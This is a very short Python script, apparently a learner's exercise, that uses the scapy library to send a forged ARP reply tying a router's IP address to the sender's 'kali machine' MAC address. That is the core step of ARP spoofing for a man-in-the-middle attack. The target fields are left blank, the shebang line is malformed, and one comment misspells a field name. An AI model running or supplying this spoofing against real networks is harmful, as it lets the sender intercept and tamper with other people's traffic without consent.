#! usr/bin/etc python3

import scapy.all as scapy


# op = 2 means response not request
# Target ip [pdst]
# Target mac address [hwdst]
# Router address [psrsc]


packet = scapy.ARP(op=2, pdst = '', hwdst = '', psrc = '') #Associate the mac address of router with kali machine
scapy.send(packet)



